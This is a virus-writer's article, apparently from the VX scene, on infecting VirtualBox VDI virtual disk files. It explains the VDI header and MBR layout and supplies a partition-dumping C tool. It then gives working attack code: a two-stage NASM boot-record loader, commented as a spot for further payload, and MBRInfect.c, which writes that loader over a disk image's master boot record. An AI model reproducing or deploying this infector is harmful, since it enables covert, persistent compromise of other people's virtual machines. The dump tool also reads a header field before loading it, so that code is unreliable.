@@ -1,0 +1,695 @@
+                       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+                       ++++                        Virtual Disks Infection by WarGame/DoomRiderz                       ++++
+                       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+1) Introduction
+2) Structure of a VDI 
+3) MBR & Partitions Table
+4) Put all together: VDIDump tool
+5) Infection
+6) Old skool: boot record infection
+7) Greetz & References
+
+
+1) Introduction
+
+   The usage of virtualization technology is increasing more and more nowadays, mainly because of it's safe test environment and ability to run another
+   system without the use of multi-boot. In this article we are going to speak about VirtualBox (http://www.virtualbox.org) virtual disks infection.
+   Let's go!
+
+   Sorry for my poor english, it's not my main language.
+
+
+2) Structure of a VDI
+
+   A VDI file is a virtual disk of VirtualBox, it can be a dynamically expanded or a fixed-size. We will talk about fixed-size virtual hard disks, since
+   they can be accessed in a simpler way.
+
+   This is the structure of a VDI:
+
+   ------------------------------------
+   |           VDIPREHEADER           |
+   ------------------------------------
+   |           VDIHEADER              |
+   ------------------------------------
+   |           DATA                   |
+   ------------------------------------
+
+   We can get a lot of interesting information from VDIPREHEADER and VDIHEADER.
+   This is the definition of VDIPREHEADER from VDICore.h:
+
+   typedef struct VDIPREHEADER
+   {
+       /** Just text info about image type, for eyes only. */
+       char            szFileInfo[64];
+       /** The image signature (VDI_IMAGE_SIGNATURE). */
+       uint32_t        u32Signature;
+       /** The image version (VDI_IMAGE_VERSION). */
+       uint32_t        u32Version;
+   } VDIPREHEADER, *PVDIPREHEADER;
+
+   The most interesting member for us is u32Version, in fact it tells us, which version of VDIHEADER is used.
+
+   There are three version of VDIHEADER:
+
+   VDIHEADER0
+   VDIHEADER1
+   VDIHEADER1PLUS
+
+
+   We will use only VDIHEADER1, because in my test virtual disk images it was the used header, but the things written here can be applied to the other
+   two types too.
+
+   This is the definition of VDIHEADER1 from VDICore.h:
+
+   typedef struct VDIHEADER1
+   {
+      /** Size of this structure in bytes. */
+      uint32_t        cbHeader;
+      /** The image type (VDI_IMAGE_TYPE_*). */
+      uint32_t        u32Type;
+      /** Image flags (VDI_IMAGE_FLAGS_*). */
+      uint32_t        fFlags;
+      /** Image comment. (UTF-8) */
+      char            szComment[VDI_IMAGE_COMMENT_SIZE];
+      /** Offset of Blocks array from the begining of image file.
+      * Should be sector-aligned for HDD access optimization. */
+      uint32_t        offBlocks;
+      /** Offset of image data from the begining of image file.
+      * Should be sector-aligned for HDD access optimization. */
+      uint32_t        offData;
+      /** Legacy image geometry (previous code stored PCHS there). */
+      VDIDISKGEOMETRY LegacyGeometry;
+      /** Was BIOS HDD translation mode, now unused. */
+      uint32_t        u32Dummy;
+      /** Size of disk (in bytes). */
+      uint64_t        cbDisk;
+      /** Block size. (For instance VDI_IMAGE_BLOCK_SIZE.) Should be a power of 2! */
+      uint32_t        cbBlock;
+      /** Size of additional service information of every data block.
+      * Prepended before block data. May be 0.
+      * Should be a power of 2 and sector-aligned for optimization reasons. */
+      uint32_t        cbBlockExtra;
+      /** Number of blocks. */
+      uint32_t        cBlocks;
+      /** Number of allocated blocks. */
+      uint32_t        cBlocksAllocated;
+      /** UUID of image. */
+      RTUUID          uuidCreate;
+      /** UUID of image's last modification. */
+      RTUUID          uuidModify;
+      /** Only for secondary images - UUID of previous image. */
+      RTUUID          uuidLinkage;
+      /** Only for secondary images - UUID of previous image's last modification. */
+      RTUUID          uuidParentModify;
+   } VDIHEADER1, *PVDIHEADER1; 
+
+   Looking at the structure's members we can see many interesting fields, but for our scope the most interesting one is OffData, it tells us where the
+   "real" disk part begins. Everything done on the disk part must be relative to OffData, for example, if we want to access the sector 456 of the disk
+   we should do something like:
+
+   ...
+   seek_vdi(OffData+456*512);
+   access_sector(); 
+   ...
+
+   We must check the u32Type member too, it tells us if virtual disk is fixed-size or dynamically expanded.
+   Here is shown the use of OffData:
+
+   ------------------------------------
+   |           VDIPREHEADER           |
+   ------------------------------------
+   |           VDIHEADER              |
+   ------------------------------------
+   |           DATA                   |
+   |           ....                   | 
+   |           OffData -> MBR         |
+   ------------------------------------
+
+   In  few words, if we'll seek from the beginning of the VDI files for OffData bytes, we'll get the location of the Master Boot Record (the sector 1
+   which contains a lot of interesting infos about the logic organization of the disk).
+
+
+3) MBR & Partitions Table
+
+   We understood how to get the location of the sector 1 (MBR), now will see its structure:
+
+   ------------------------------------------ 0
+   |                                        |   \
+   |              CODE AREA                 |     The first 446bytes contains the boot code 
+   |                                        |   /
+   ------------------------------------------ 446
+   |                                        |  \
+   |           PARTITIONS TABLE             |     The partition table occupies 64 bytes, it is made of four entries of 16 bytes
+   |                                        |  /
+   ------------------------------------------ 510
+   |                                        |  \
+   |          BOOT RECORD SIGNATURE         |    The boot record signature occupies the last 2 bytes, it must be set to AA55h
+   |                                        |  /
+   ------------------------------------------ 512
+
+   The size of MBR or any other sector is 512 bytes (this is the standard sector size for normal x86-based PC).
+   The partitions table is made in this way:
+
+   -----------------------------------------
+   |          PARTITION ENTRY 1            |  16 bytes
+   -----------------------------------------
+   |	      PARTITION ENTRY 2            |  16 bytes
+   -----------------------------------------
+   |          PARTITION ENTRY 3            |  16 bytes
+   ----------------------------------------- 
+   |          PARTITION ENTRY 4            |  16 bytes   
+   -----------------------------------------
+
+   Each entry occupies 16 bytes, here the their structure:
+   
+   -------------------------------------- 0
+   |                                    |  \
+   |           BOOT INDICATOR           |    If this field is set to 80h is the partition is active, if it's not, it's set to 00h 
+   |                                    |  /
+   -------------------------------------- 1
+   |                                    |  \
+   |           STARTING CHS VALUE       |    This field tells us the location of the first sector of the partition if it's within first 1024 cylinders
+   |                                    |  /
+   -------------------------------------- 4
+   |                                    |  \ 
+   |           PARTITION TYPE           |    Partition type (the file system of the partition (FAT16, FAT32, NTFS, EXT2, EXT3, et cetera))
+   |                                    |  /
+   -------------------------------------- 5 
+   |                                    |  \
+   |           ENDING CHS VALUE         |    This field tells us location of the last sector of partition if it's within first 1024 cylinders
+   |                                    |  /
+   -------------------------------------- 8
+   |                                    |  \
+   |           STARTING SECTOR          |    This field tells us the first sector of partition, counting from the sector 0 (using 4 bytes)
+   |                                    |  /
+   -------------------------------------- 12
+   |                                    |  \
+   |       PARTITION SIZE IN SECTORS    |    This field tells us the size of partition in sectors (using 4 bytes)
+   |                                    |  /
+   -------------------------------------- 16
+
+   Now we are able to find the MBR and getting from it the infos that we need about the logic layout of our virtual disk.
+   The next step will be to find a way to access such partitions or to use a better term, "mounting" them.
+
+
+4) Put all together: VDIDump tool
+   
+   I tested this tool only on my ubuntu linux system.
+
+----------------------------------- DumpVDI.c ------------------------------------------------
+
+/* A tool to dump partitions table inside a virtual disk (vdi file) by WarGame/DoomRiderz */
+
+#include <stdio.h>
+#include <string.h>
+
+/* from VDICore.h and VBoxHDD-new.h*/
+
+typedef unsigned int uint32_t;
+typedef unsigned long long uint64_t;
+
+typedef struct VDIDISKGEOMETRY
+{
+    /** Cylinders. */
+    uint32_t    cCylinders;
+    /** Heads. */
+    uint32_t    cHeads;
+    /** Sectors per track. */
+    uint32_t    cSectors;
+    /** Sector size. (bytes per sector) */
+    uint32_t    cbSector;
+} VDIDISKGEOMETRY, *PVDIDISKGEOMETRY;
+
+typedef struct VDIPREHEADER 
+{
+    /** Just text info about image type, for eyes only. */
+    char            szFileInfo[64];
+    /** The image signature (VDI_IMAGE_SIGNATURE). */
+    uint32_t        u32Signature;
+    /** The image version (VDI_IMAGE_VERSION). */
+    uint32_t        u32Version;
+} VDIPREHEADER, *PVDIPREHEADER;
+
+#define VDI_IMAGE_COMMENT_SIZE    256
+
+typedef struct VDIHEADER1
+{
+    /** Size of this structure in bytes. */
+    uint32_t        cbHeader;
+    /** The image type (VDI_IMAGE_TYPE_*). */
+    uint32_t        u32Type;
+    /** Image flags (VDI_IMAGE_FLAGS_*). */
+    uint32_t        fFlags;
+    /** Image comment. (UTF-8) */
+    char            szComment[VDI_IMAGE_COMMENT_SIZE];
+    /** Offset of Blocks array from the begining of image file.
+     * Should be sector-aligned for HDD access optimization. */
+    uint32_t        offBlocks;
+    /** Offset of image data from the begining of image file.
+     * Should be sector-aligned for HDD access optimization. */
+    uint32_t        offData;
+    /** Legacy image geometry (previous code stored PCHS there). */
+    VDIDISKGEOMETRY LegacyGeometry;
+    /** Was BIOS HDD translation mode, now unused. */
+    uint32_t        u32Dummy;
+    /** Size of disk (in bytes). */
+    uint64_t        cbDisk;
+    /** Block size. (For instance VDI_IMAGE_BLOCK_SIZE.) Should be a power of 2! */
+    uint32_t        cbBlock;
+    /** Size of additional service information of every data block.
+     * Prepended before block data. May be 0.
+     * Should be a power of 2 and sector-aligned for optimization reasons. */
+    uint32_t        cbBlockExtra;
+    /** Number of blocks. */
+    uint32_t        cBlocks;
+    /** Number of allocated blocks. */
+    uint32_t        cBlocksAllocated;
+    /** UUID of image. */
+    char          uuidCreate[16];
+    /** UUID of image's last modification. */
+    char          uuidModify[16];
+    /** Only for secondary images - UUID of previous image. */
+    char          uuidLinkage[16];
+    /** Only for secondary images - UUID of previous image's last modification. */
+    char          uuidParentModify[16];
+} VDIHEADER1, *PVDIHEADER1;
+
+/** Get VDI major version from combined version. */
+#define VDI_GET_VERSION_MAJOR(uVer)    ((uVer) >> 16)
+/** Get VDI minor version from combined version. */
+#define VDI_GET_VERSION_MINOR(uVer)    ((uVer) & 0xffff)
+
+typedef struct MBR /* my definition for master boot record */
+{
+	char boot_code[446];
+	unsigned char partitions[4][16];
+	unsigned short signature; 
+}MBR;
+
+/****************/
+
+
+void ExtractPartition(char *f,int offdata,int part_num,int start_sect,int size_sect)
+{
+	FILE *vdi = NULL,*part = NULL;	
+	char ex_name[128],buf[512];
+	unsigned int size = size_sect*512;
+
+	if((vdi = fopen(f,"r")) == NULL)
+	{
+		printf("can't open %s\n",f);
+		return;
+	}
+	
+	sprintf(ex_name,"partition_%d____%d_%d.raw",part_num,start_sect,size_sect);
+
+	if((part = fopen(ex_name,"a+")) == NULL)
+	{
+		fclose(vdi);
+		printf("can't open %s\n",ex_name);
+		return;
+	}
+
+	fseek(vdi,offdata,SEEK_SET);
+	fseek(vdi,start_sect*512,SEEK_CUR);
+	printf("Extracting...\n");
+		
+	while(size > 0)
+	{
+		fread(buf,512,1,vdi);
+		fwrite(buf,512,1,part);
+		size -= 512;
+	}
+
+	fclose(vdi);
+	fclose(part);
+
+	printf("Extraction done to %s\n",ex_name);
+	
+}
+
+void DumpVDIPartitionTable(char *f, int extract)
+{
+	FILE *fp = fopen(f,"r");
+	VDIPREHEADER pre;
+	VDIHEADER1 h1;
+	MBR mbr;
+	int offdata = 0,p_cnt,sect_after_mbr,sect_in_partition;
+
+	if(fp == NULL)
+	{
+		printf("can't open %s\n",f);
+	}
+
+	else
+	{
+		fread(&pre,sizeof(VDIPREHEADER),1,fp);
+
+		if(VDI_GET_VERSION_MAJOR(pre.u32Version) == 1 && VDI_GET_VERSION_MINOR(pre.u32Version) == 1)
+		{
+
+			if(h1.u32Type == 1)
+			{
+				printf("%s is not a fixed size disk\n",f);
+			}
+		
+				else
+				{
+					fread(&h1,sizeof(VDIHEADER1),1,fp);
+					
+					if(h1.offData != 0)
+					{
+						printf("Offdata (%s) -> %d\n",f,h1.offData);
+						rewind(fp);
+						fseek(fp,h1.offData,SEEK_SET);	
+						fread(&mbr,sizeof(MBR),1,fp);
+						fclose(fp);
+						printf("MBR signature -> 0x%x\n",mbr.signature);
+						for(p_cnt = 0;p_cnt < 4;p_cnt++)
+						{
+							memcpy(&sect_after_mbr,mbr.partitions[p_cnt]+8,4);
+							memcpy(&sect_in_partition,mbr.partitions[p_cnt]+12,4);
+							printf("Partition #%d -> status: %10s - type: 0x%.2x - partition begins at sector: %9d - sectors in partition: %9d\n",p_cnt,(mbr.partitions[p_cnt][0] == 0x80) ? "bootable" : "not active",mbr.partitions[p_cnt][4],sect_after_mbr,sect_in_partition);
+							if(extract)
+								ExtractPartition(f,h1.offData,p_cnt,sect_after_mbr,sect_in_partition);
+						}
+					}
+	
+					else
+					{
+						printf("header and offdata unknown in %s\n",f);
+					}
+				}
+		} 
+
+		else
+		{
+			printf("Header not supported in %s\n",f);
+		}
+	
+	}
+}
+
+int main(int argc,char *argv[])
+{
+	int a_cnt,extract;
+
+	if(argc == 1)
+	{
+		printf("Dump partitions table from VDI (virtual disk) files by WarGame/DoomRiderz\n");
+		printf("Usage: [-d | -e] <vdi file 1> <vdi file 2> ... <vdi file n> \n",argv[0]);
+		printf("Options:\n");
+		printf("-d only print the partitions table on stdout\n");
+		printf("-e print the partitions table on stdout and extract the partitions one by one and write them on files\n");
+		return 1;
+	}
+
+	else
+	{
+		if(strcmp(argv[1],"-d") == 0)
+		{
+			extract = 0;
+		}
+
+		else if(strcmp(argv[1],"-e") == 0)
+		{
+			extract = 1;
+		}
+
+		else
+		{
+			printf("Invalid option\n");
+			return 1;
+		}
+		
+		for(a_cnt = 2;a_cnt < argc;a_cnt++)
+			DumpVDIPartitionTable(argv[a_cnt],extract);
+
+		return 0;
+	}
+}
+
+------------------------------------ EOF -----------------------------------------------------
+
+--------------------------------- Example output ---------------------------------------------
+wargame@wargame-desktop:~/my stuff/vdi$ sudo ./DumpVDI -d /root/.VirtualBox/VDI/xpsp0.vdi
+Offdata (/root/.VirtualBox/VDI/xpsp0.vdi) -> 13312
+MBR signature -> 0xaa55
+Partition #0 -> status:   bootable - type: 0x07 - partition begins at sector:        63 - sectors in partition:   6322113
+Partition #1 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+Partition #2 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+Partition #3 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+----------------------------------------------------------------------------------------------
+
+
+5) Infection
+ 
+   The most simple way to infect a virtual disk requires only the mount command of linux, in fact it is able to access a lot of file systems using the drivers
+   that the kernel offers.
+   So, the infection process using this simple way is:
+
+   1) Find the virtual disk to infect
+   2) Get offData and the partition table from it
+   3) Get the location of the first sector of partition we want to mount
+   4) Run the mount command
+   5) Access the mounted partition and do the real infection
+   6) Unmount it
+   
+   So, for example if we want to mount and infect the first ext3 partition (we assume that the first sector of this partition is the sector 63) 
+   of a virtual disk with an offData which equals to 13312, we would use this command:
+    
+   sudo mount -t ext3 -o ro,loop,offset=45568 the_vdi_file.vdi /our_mount_point
+
+   Where 45568 is equal to 13312+63*512.
+   This way is fast and requires not so much code because the hard part is made by the mount command. But it has a big limitation: it is not portable.
+   Infact if we do not have the mount command and the right privileges we can't mount and infect the virtual disk. Then windows does not offer such 
+   possibility because it can mount only a limited numbers of file systems (fat16,fat32,ntfs).  We can use this way only in some limited circumstances.
+   There is an other way but it would require to implement our file system drivers for our infector, so we could infect a vdi with no other external
+   requirements.
+
+
+6) Old skool: boot record infection
+
+   There is an other good way to infect our virtual disk, we can infect the master boot record itself. The MBR infact is the place where it's located the
+   code that make the OS boots up, if we take control of it we can own the system at very low level. 
+   At the DOS age, multipartite viruses were able to spread using floppies, in fact it could hook the interrupt 13h (this interrupt controls the access to
+   disks) and so intercept every access to disk. So when a user booted his/her pc with the infected floppy the process could take place again.
+   That was possible because the DOS didn't have any form of control for hardware access. The modern OSes like Windows NT, Unix (BSD, MacOS), GNU/Linux use
+   their own interface made of device drivers to access the hardware layer and so that tech is not possible.
+
+   Note: Using this way we can infect variable sized virtual disk with no problems.
+   In this article we will talk about backdooring the master boot record of the virtual disk. Our code in fact will not have the possibility to spread.
+   Here we will use an example code that is made of two parts (written for nasm):
+
+   1) The first part of our loader is located in the sector 1 (MBR), it will be loaded by the BIOS at address 0000:7c00. When it takes control it prints a
+      msg on the screen and then waits for the user to press any key. When this happens, the code loads from the sector 2 the second part of the loader at
+      the address  0000:1000h and then jumps to it.
+   2) The second part of the loader reads the sector 3 containing the original MBR and then loads it in memory at address 0000:7c00 (to be sure it
+      works, infact every boot loader assumes to be loaded from this address) and then jumps to it. 
+   3) The original boot loader takes the control and it makes the OS boots up.
+
+-------------------- loader.asm (the code located on the sector 1) --------------------
+; the first stage of our loader
+
+ORG 7c00h      
+BITS 16           
+jmp boot
+
+msg db 'boot record infection on virtual disk! Press any key to continue',13,10,0  
+msg1 db 'failed to read the loader1!',13,10,0
+
+boot:            ; setup the stack
+     xor ax,ax
+     mov ds,ax
+     mov es,ax
+     mov ss,ax
+     mov sp,7c00h
+
+setup_writing:
+     mov ah,0eh
+     mov bx,0007
+     xor si,si
+
+print_msg:      ; print our msg on the screen
+     mov al, [msg+si]    
+     test al,al
+     jz wait_key
+     int 10h             
+     inc si 
+     jmp print_msg
+
+wait_key:
+     mov ah,00h
+     int 16h
+
+;; here we could put other code that performs other actions depending of the victim OS
+
+load_loader1: 
+     mov dl,80h
+     xor ax,ax
+     int 13h ; reset drive
+     mov es,ax   ; read at    
+     mov bx,1000H ; 0000:1000
+     mov ah,02h  ; read function
+     mov al,01h ; read only one sector
+     mov cx,02h ; sector 2
+     mov dh,0 
+     mov dl,80h    
+     int 13h ; read the sector
+     jc failed_to_read
+
+jump_to_loader1:
+     db 0Eah ; jump at
+     dw 1000h ; memory location
+     dw 0    ; 0000:1000h
+
+failed_to_read:
+     mov ah,0eh
+     mov bx,0007
+     xor si,si
+
+p:
+     mov al, [msg1+si]    
+     test al,al
+     jz exit
+     int 10h
+     inc si
+     jmp p
+
+exit:
+     ret
+
+times 510-($-$$) db 0    
+dw 0aa55h   
+------------------------------------ EOF ----------------------------------------------
+
+-------------------- loader1.asm (the code located on the sector 2) -------------------
+; the second stage of the loader
+
+ORG 1000h      
+BITS 16 
+jmp boot
+
+msg1 db 'failed to read the original boot sector!',13,10,0
+
+boot:            ; setup the stack
+     xor ax,ax
+     mov ds,ax
+     mov es,ax
+     mov ss,ax
+     mov sp,1000h  
+
+;; here we could put other code that performs other actions depending of the victim OS
+
+load_original_mbr: 
+     mov dl,80h
+     xor ax,ax
+     int 13h ; reset drive
+     mov es,ax   ; read at    
+     mov bx,7c00H ; 0000:7c00
+     mov ah,02h  ; read function
+     mov al,01h ; read only one sector
+     mov cx,03h ; sector 3
+     mov dh,0 
+     mov dl,80h    
+     int 13h ; read the sector
+     jc failed_to_read
+
+jump_to_original_mbr: ; here the original mbr gets the control
+     db 0Eah ; jump at
+     dw 7c00h ; memory location
+     dw 0    ; 0000:7c00h
+
+failed_to_read:
+     mov ah,0eh
+     mov bx,0007
+     xor si,si
+
+p:
+     mov al, [msg1+si]    
+     test al,al
+     jz exit
+     int 10h             
+     inc si
+     jmp p
+
+exit:
+     ret
+
+times 510-($-$$) db 0    
+dw 0aa55h ; this is useless here
+--------------------------------- EOF -------------------------------------------------  
+
+My example code simply acts like a "proxy", infact after interacting a bit with the user it passes the control to the true loader. For more look at BOOT KIT
+(http://www.rootkit.com/project.php?id=34).
+Here a simple tool to infect a VDI with my loader:
+
+------------------------------ MBRInfect.c ------------------------------------
+/* A simple tool to infect the MBR of a virtual disk by WarGame/DoomRiderz */
+
+#include <stdio.h>
+#include <string.h>
+
+main(int argc,char *argv[])
+{
+	FILE *in = NULL,*in1 = NULL,*out = NULL;
+	char buf[512];
+	char buf1[512];
+	char original[512];
+
+        if(argv[1] == NULL || argv[2] == NULL)
+	{
+		printf("Usage: %s <vdi file> <offdata of the vdi>\n",argv[0]);
+		return -1;
+	}
+
+	if((in = fopen("loader.bin","r")) == NULL)
+	{
+		printf("can't open loader.bin\n");
+		return -1;
+	}
+
+	if((out = fopen(argv[1],"r+")) == NULL)
+	{	
+		printf("can't open %s\n",argv[1]);
+		return -1;
+	}
+
+	if((in1 = fopen("loader1.bin","r")) == NULL)
+	{
+		printf("can't open loader1.bin\n");
+		return -1;
+	}
+
+	fread(buf,512,1,in);
+	fread(buf1,512,1,in1);
+	fseek(out,atoi(argv[2]),SEEK_SET); /* seek to MBR pointed by offData */
+	fread(original,512,1,out); /* read the original mbr */
+	fseek(out,-512,SEEK_CUR);
+	memcpy(buf+446,original+446,64); /* put the partition table in our loader */
+	fwrite(buf,512,1,out); /* write loader (sector 1) */
+	fwrite(buf1,512,1,out); /* write loader 1 (sector 2) */
+	fwrite(original,512,1,out); /* write original mbr (sector 3) */
+	fclose(in);
+	fclose(out);
+	fclose(in1);
+	printf("Done\n");
+	return 0;
+}
+----------------------------------- EOF -------------------------------------------
+
+
+7) Greetz & References
+   
+   greetz to all people on #eof-project, #virus, #vxcode @ undernet
+   
+   References:
+   http://www.virtualbox.org/
+   http://www.virtualbox.org/browser/trunk/src/VBox/Devices/Storage/VDICore.h
+   http://www.rootkit.com/project.php?id=34
+   http://vx.netlux.org/lib/static/vdat/tufirstb.htm
+
+   For more info, visit: http://vx.netlux.org/wargamevx or send me a mail to: wargame89@yahoo.it
+
+
